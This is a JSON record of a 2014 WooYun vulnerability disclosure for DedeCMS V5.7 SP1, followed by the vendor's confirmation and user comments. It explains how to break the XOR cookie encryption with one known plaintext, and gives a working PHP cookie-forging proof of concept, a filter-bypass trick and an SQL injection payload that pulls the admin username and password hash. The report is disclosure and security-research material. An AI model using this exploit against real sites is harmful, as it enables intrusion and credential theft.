{"id": 146, "wybug_id": "wooyun-2014-071655", "wybug_title": "DedeCMS-V5.7-SP1(2014-07-25)sql注入+新绕过思路", "wybug_corp": "Dedecms", "wybug_author": "roker", "wybug_date": "2014-08-11 11:24", "wybug_open_date": "2014-11-09 11:26", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-17：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-09：\t细节向公众公开  简要描述： rt................好紧张。。 详细说明：  让我们来看看这个文件/include/shopcar.class.php提取关键加解密函数代码\nfunction enCrypt($txt)    {        srand((double)microtime() * 1000000);        $encrypt_key = md5(rand(0, 32000));        $ctr = 0;        $tmp = '';        for($i = 0; $i < strlen($txt); $i++)        {            $ctr = $ctr == strlen($encrypt_key) ? 0 : $ctr;            $tmp .= $encrypt_key[$ctr].($txt[$i] ^ $encrypt_key[$ctr++]);        }        return base64_encode($this->setKey($tmp));    }    //解密接口字符串    function deCrypt($txt)    {        $txt = $this->setKey(base64_decode($txt));        $tmp = '';        for ($i = 0; $i < strlen($txt); $i++)        {            $tmp .= $txt[$i] ^ $txt[++$i];        }        return $tmp;    }    //处理加密数据    function setKey($txt)    {        global $cfg_cookie_encode;        $encrypt_key = md5(strtolower($cfg_cookie_encode));        $ctr = 0;        $tmp = '';        for($i = 0; $i < strlen($txt); $i++)        {            $ctr = $ctr == strlen($encrypt_key) ? 0 : $ctr;            $tmp .= $txt[$i] ^ $encrypt_key[$ctr++];        }        return $tmp;    }    //串行化数组    function enCode($array)    {        $arrayenc = array();        foreach($array as $key => $val)        {            $arrayenc[] = $key.'='.urlencode($val);        }        return implode('&', $arrayenc);    }    //创建加密的_cookie    function saveCookie($key,$value)    {        if(is_array($value))        {            $value = $this->enCrypt($this->enCode($value));        }        else        {            $value = $this->enCrypt($value);        }        setcookie($key,$value,time()+36000,'/');    }    //获得解密的_cookie    function getCookie($key)    {        if(isset($_COOKIE[$key]) && !empty($_COOKIE[$key]))        {            return $this->deCrypt($_COOKIE[$key]);        }    }}\n是不是感觉很熟悉？看这里--> WooYun: Destoon B2B 2014-05-21最新版绕过全局防御暴力注入（官方Demo可重现） 一样的算法，只不过将microtime 替换成了 md5(rand(0, 32000)),按照 海贼牛的方法的话，我们需要暴力 穷举32^36次，这数太大，我不敢算，我们真的需要暴力破解么？？直接来看看 解密函数吧。 \nfunction deCrypt($txt)    {        $txt = $this->setKey(base64_decode($txt));        $tmp = '';        for ($i = 0; $i < strlen($txt); $i++)        {            $tmp .= $txt[$i] ^ $txt[++$i];        }        return $tmp;    }    //处理加密数据    function setKey($txt)    {        global $cfg_cookie_encode;        $encrypt_key = md5(strtolower($cfg_cookie_encode));        $ctr = 0;        $tmp = '';        for($i = 0; $i < strlen($txt); $i++)        {            $ctr = $ctr == strlen($encrypt_key) ? 0 : $ctr;            $tmp .= $txt[$i] ^ $encrypt_key[$ctr++];        }        return $tmp;    }\n现在 我们假设 密文为 ABCDEF....（base_decode后的） 。通过上述代码 可以发现 解密函数中 参与 运算的是 key的MD5值。我们假定为 K1 k2 k3 k4 k5 k6........k32.首先带入 setKey函数， \nA^K1 ->M1 \tB^K2 ->M2 \tC^K3 ->M3 \tD^K4 ->M4\n然后将 M1~6 带入decrypt后的操作。 \nM2^M1 ->a M4^M3 ->b M6^M5 ->c\nabc 即为 我们的明文对于异或算法 我们知道 它有以下特性  \nH^I = J  ->  H^J=I(H^I)^J=H^I^J\n密文A B 与明文 a 所对应的的关系为。\nA^K1 = M1  M1^M2 = a   B^K2 = M2\n 联立得（尼玛像是在做奥数。。） A^K1^B^K2 =a  即 A^B^a = K1^K2，同理可得到 C^D^b = K3^K4 E^F^c=K5^K6k1~32是 密匙k的32位 md5值，是固定不变的。那么 得到如下 如下关系： 任何密文的i ，i+1 位 与其所对应的的 明文的 i 位 做异或运算(i为偶数) 结果是一个固定不变的值（Ki^Ki+1）so，我们只需要一个已知明文的密文就可以 构造任意密文了。poc如下，\nfunction dede_cracked($Expressly,$Ciphertext,$str,$way){$Ciphertext = base64_decode($Ciphertext);if ($way==\"descrypt\"){$text2=\"\";$str=base64_decode($str);}else{$text2=\"a\";}$j=0;$s=0;for($i=0;$i<strlen($str);$i++,$s++){if($j==32){$j=0;$s=0;}$tmp=$Ciphertext[$j]^$Ciphertext[$j+1];$tmp=$tmp^$Expressly[$s];$tmp=$tmp^$str[$i];if ($way==\"descrypt\"){$text1=$tmp^$str[++$i];}else{$text1=$tmp^$text2;}$xxoo =$xxoo.$text2.$text1;$j=$j+2;}if ($way==\"descrypt\"){echo $xxoo;}else{echo base64_encode($xxoo);}}\n在 plus/carbuyaction.php\nforeach($Items as $key=>$val)                {                    $val['price'] = str_replace(\",\",\"\",$val['price']);                    $dsql->ExecuteNoneQuery(\"INSERT INTO `#@__shops_products` (`aid`,`oid`,`userid`,`title`,`price`,`buynum`)                    VALUES ('$val[id]','$OrdersId','$userid','$val[title]','$val[price]','$val[buynum]');\");                }\n将解密后的数据带入了数据库。本以为到这里就结束了，然而，dede自带的防护sql注入的函数做了更新，以前的@，char都不能用了。想了很久终于想到了办法，我们可以用双引号来包裹 ' 再用逗号分隔 两个相连的 ''。\n看到函数里的这段代码你就知道为什么我要这么做了。。直接看我的下面的sql语句可能会更形象~if (strpos($clean, '@') !== FALSE  OR strpos($clean,'char(')!== FALSE         OR strpos($clean,'$s$$s$')!== FALSE)\n首先，注册用户，将一个商品加入购物车，来到plus/car.php页面，此时查看cookie\n\nShop_De开头的和 DedeUserID就是我们所需要的~调用poc里的函数得到 最终playload\ndede_cracked(\"id=108&price=11&units=&buynum=1&title=aa\",\"AWgGMlFrAzNUMAFqWyYBdFV0UmgHNFI3Vm0BMwUwBC4AdQc5CmRVIAcgBWtfNVBzATBVcwApAW8FdlE%2FWWBVaAEnBiJRPwN2VGwBN1s9AWVVZw==\",\"id=',\\\"'&title=\\\" or ',','8',(SELECT concat(uname,0x23,pwd) FROM dede_admin LIMIT 1),',','1')#\",\"encrypt\");\n修改cookie，提交订单可以看到mysql的执行日志\nINSERT INTO `dede_shops_products` (`aid`,`oid`,`userid`,`title`,`price`,`buynum`)                    VALUES ('',\"'','wooyuni','8','\" or ',','8',(SELECT concat(uname,0x23,pwd) FROM dede_admin LIMIT 1),',','1')#','0.00','0')\n查看商品，ok，数据出来了~\n\n   漏洞证明：  \n\n   修复方案：  你们更专业~~   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2014-08-14 15:22 厂商回复： 已经修复，感谢提交 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-11 11:25 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  mark    \n     2014-08-11 11:26 |    \t\tpigzhu \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | 网络共享！)\t\t \n  mark    \n     2014-08-11 11:26 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  火了。    \n     2014-08-11 11:36 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  前排啊    \n     2014-08-11 11:36 |    \t\t迦南 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:11        | 我不是玩黑，我就是认真)\t\t \n  我也紧张啊    \n     2014-08-11 11:36 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  mark    \n     2014-08-11 11:37 |    \t\twanglaojiu \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:39        | 道生一，一生二，二生三，三生万物，万物负...)\t\t \n  顶起    \n     2014-08-11 11:48 |    \t\tonfocus \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | php)\t\t \n  我几个站都是用的dede，好紧张。。。    \n     2014-08-11 11:49 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  完美利用否?    \n     2014-08-11 11:53 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  在线更新 补丁才是 这个日期，官方还是6月的补丁    \n     2014-08-11 11:55 |    \t\tp4ssw0rd \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:92        | 不作死就不会死)\t\t \n  mark    \n     2014-08-11 12:58 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:76        | 活到老，学到老!)\t\t \n  好紧张    \n     2014-08-11 14:47 |    \t\tP w \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:14        | -这家伙很懒,什么都没有留下。其实我真的很...)\t\t \n  好紧张    \n     2014-08-11 16:57 |    \t\tDeep \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 一个小白.想要变小黑.)\t\t \n  make    \n     2014-08-12 15:19 |    \t\t冉冉升起 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | ...)\t\t \n  hello roker Hacker    \n     2014-08-12 15:23 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  @冉冉升起 师尊昵豪啊    \n     2014-08-12 20:29 |    \t\t我还爱 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 虚心学习)\t\t \n  mark    \n     2014-08-14 01:32 |    \t\tlck丶 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 求大牛拿0day砸死)\t\t \n  mark    \n     2014-08-14 03:00 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  @疯狗 来个审核啊。。更新了下，上次很多没写好    \n     2014-08-14 19:22 |    \t\t魂淡、 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 么么哒)\t\t \n  dede被日破了。。。    \n     2014-09-02 15:04 |    \t\t小庄 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        )\t\t \n  看不到内容啊~    \n     2014-09-04 11:09 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  我去，太给力了    \n     2014-10-15 14:17 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  我去，太给力了     \n     2014-11-06 10:34 |    \t\t三十度 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 本屌精通各种花式撸管，装逼32式炉火纯青。...)\t\t \n  台屌    \n     2014-11-09 13:32 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  兄台好屌    \n     2014-11-10 16:05 |    \t\tlaoyao \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:5        | ด้้้้้็็็็็้้้้้็็็็...)\t\t \n  吊     \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}